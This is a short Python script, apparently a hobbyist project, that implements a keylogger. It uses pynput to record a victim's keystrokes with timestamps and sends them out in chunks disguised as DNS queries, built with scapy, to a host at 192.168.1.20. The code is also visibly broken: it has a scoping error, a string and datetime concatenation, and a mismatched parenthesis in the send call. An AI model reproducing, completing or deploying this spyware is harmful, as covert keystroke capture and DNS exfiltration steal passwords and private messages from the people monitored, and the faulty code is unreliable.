
from scapy.all import DNS, DNSQR, IP,send, UDP,sr1,sr
from pynput.keyboard import Key, Listener
import datetime

"""let's create a simple keylogger with python":the mission of this piece of code is to send 15 characteres every time in a weird form: dns request"""

text=""

def on_press(key):  #this function define what we will do when the victime use his keyboard

   if(len(text)==0):
      text="starting at"+" "+datetime.datetime.now()
      text=text+" "+str(key) #recording the first intercept character
   elif(len(text)==15):         
      text=text+str(key) #recording the last character
      text=text+" "+"ending at"+" "+datetime.datetime.now()
      sr1(IP(dst='192.168.1.20')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=text),type='A')))
      text="" #restarting the string 
   else:
      text=text+str(key)


#let start now

with Listener(on_press=on_press) as listener:
    listener.join()       

